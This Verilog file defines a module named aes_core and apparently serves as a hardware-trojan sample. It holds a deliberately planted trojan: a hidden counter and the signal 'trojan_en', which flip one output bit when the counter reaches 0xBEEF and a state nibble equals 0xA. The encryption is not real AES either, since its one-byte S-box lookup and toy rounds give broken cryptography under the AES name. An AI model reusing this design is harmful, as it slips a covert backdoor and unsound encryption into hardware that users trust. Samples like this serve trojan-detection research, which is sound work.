module aes_core (
    clk,
    rst_n,
    in_data,
    key,
    start,
    out_data,
    done
);

    input clk;
    input rst_n;
    input [127:0] in_data;
    input [127:0] key;
    input start;
    output reg [127:0] out_data;
    output reg done;

    reg [127:0] state_reg;
    reg [127:0] key_reg;
    reg [3:0]   round_cnt;
    reg         busy;

    reg [15:0] trig_cnt;

    reg [7:0] sbox [0:15];
    reg [7:0] rcon [0:10];

    integer i;

    initial begin
        sbox[0]  = 8'h63; sbox[1]  = 8'h7c; sbox[2]  = 8'h77; sbox[3]  = 8'h7b;
        sbox[4]  = 8'hf2; sbox[5]  = 8'h6b; sbox[6]  = 8'h6f; sbox[7]  = 8'hc5;
        sbox[8]  = 8'h30; sbox[9]  = 8'h01; sbox[10] = 8'h67; sbox[11] = 8'h2b;
        sbox[12] = 8'hfe; sbox[13] = 8'hd7; sbox[14] = 8'hab; sbox[15] = 8'h76;

        rcon[0]  = 8'h01; rcon[1]  = 8'h02; rcon[2]  = 8'h04; rcon[3]  = 8'h08;
        rcon[4]  = 8'h10; rcon[5]  = 8'h20; rcon[6]  = 8'h40; rcon[7]  = 8'h80;
        rcon[8]  = 8'h1b; rcon[9]  = 8'h36; rcon[10] = 8'h6c;
    end

    wire [7:0] sub_byte0 = sbox[state_reg[3:0]];
    wire [127:0] round_out = {state_reg[127:8], sub_byte0} ^
                              {key_reg[119:0], rcon[round_cnt]};

    wire trojan_en;
    assign trojan_en = (trig_cnt == 16'hBEEF) && (state_reg[3:0] == 4'hA);

    wire [127:0] out_data_pre;
    assign out_data_pre = {state_reg[127:8], state_reg[7] ^ trojan_en};

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            trig_cnt <= 16'h0000;
        end else begin
            trig_cnt <= trig_cnt + 16'h0001;
        end
    end

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            state_reg <= 128'h0;
            key_reg   <= 128'h0;
            round_cnt <= 4'h0;
            busy      <= 1'b0;
            done      <= 1'b0;
            out_data  <= 128'h0;
        end else begin
            done <= 1'b0;

            if (start && !busy) begin
                state_reg <= in_data;
                key_reg   <= key;
                round_cnt <= 4'h0;
                busy      <= 1'b1;
            end else if (busy) begin
                if (round_cnt < 4'd10) begin
                    state_reg <= round_out;
                    key_reg   <= {key_reg[119:0], key_reg[127:120]};
                    round_cnt <= round_cnt + 4'h1;
                end else begin
                    out_data <= out_data_pre;
                    done     <= 1'b1;
                    busy     <= 1'b0;
                end
            end
        end
    end

endmodule